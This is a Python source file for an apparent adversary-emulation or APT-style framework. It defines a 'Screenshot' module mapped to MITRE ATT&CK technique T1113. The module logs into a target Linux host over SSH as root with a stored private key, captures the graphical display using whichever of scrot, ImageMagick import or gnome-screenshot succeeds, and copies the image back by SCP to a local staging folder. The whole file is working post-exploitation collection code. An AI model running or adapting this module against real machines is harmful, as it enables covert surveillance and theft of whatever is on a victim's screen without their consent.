import logging
import os
from datetime import datetime

from modules.base_module import APT_MODULE
from models.target import Target, MESSAGE_TYPE
from models.module_metadata import AttackTactic, TargetOS, TargetArch
from utils.ssh_helper import ssh_exec, scp_get

# Screenshot tools tried in order of preference: (display_name, command)
_SCREENSHOT_TOOLS = [
    ("scrot",             "DISPLAY=:0 scrot /tmp/apt_screenshot.png 2>&1"),
    ("import",            "DISPLAY=:0 import -window root /tmp/apt_screenshot.png 2>&1"),
    ("gnome-screenshot",  "DISPLAY=:0 gnome-screenshot -f /tmp/apt_screenshot.png 2>&1"),
]


class screenshot(APT_MODULE):
    name = "Screenshot"
    description = (
        "Captures a screenshot of the target's graphical display (DISPLAY=:0) using "
        "whichever tool is available (scrot, ImageMagick import, gnome-screenshot). "
        "The resulting image is SCP'd to a local staging directory."
    )
    tactic = AttackTactic.COLLECTION
    technique_id = "T1113"
    technique_name = "Screen Capture"
    compatible_os = [TargetOS.LINUX]
    compatible_arch = [TargetArch.ANY]

    ssh_user = "root"
    ssh_port = 22
    ssh_key_path = "~/.ssh/id_rsa"
    local_staging_dir = os.path.expanduser("~/apt_screenshots")

    def __init__(self) -> None:
        super().__init__()

    def action(self, target: Target):
        os.makedirs(self.local_staging_dir, exist_ok=True)

        # Try each screenshot tool until one succeeds
        captured = False
        for tool, cmd in _SCREENSHOT_TOOLS:
            target.log_activity(f"Trying {tool}...", True)
            stdout, stderr, rc = ssh_exec(
                target.ip_label, cmd,
                user=self.ssh_user, port=self.ssh_port, key_path=self.ssh_key_path,
            )
            if rc == 0:
                captured = True
                target.log_activity(f"Screenshot captured with {tool}")
                break
            logging.log(
                logging.DEBUG,
                f"screenshot [{target.ip_label}] {tool} failed (rc={rc}): {stderr}",
            )

        if not captured:
            target.log_activity(
                "No screenshot tool succeeded – target may lack a graphical display",
                True, MESSAGE_TYPE.ERROR,
            )
            return

        # SCP the file back
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        local_file = os.path.join(
            self.local_staging_dir, f"{target.ip_label}_{timestamp}.png")
        target.log_activity("Retrieving screenshot via SCP...", True)
        ok, result = scp_get(
            target.ip_label, "/tmp/apt_screenshot.png", local_file,
            user=self.ssh_user, port=self.ssh_port, key_path=self.ssh_key_path,
        )
        if ok:
            target.log_activity(
                f"Screenshot saved to {local_file}", True, MESSAGE_TYPE.SUCCESS)
        else:
            logging.log(logging.ERROR, f"screenshot SCP [{target.ip_label}]: {result}")
            target.log_activity(f"SCP failed: {result}", True, MESSAGE_TYPE.ERROR)

    def enable(self, e):
        self.enabled = e
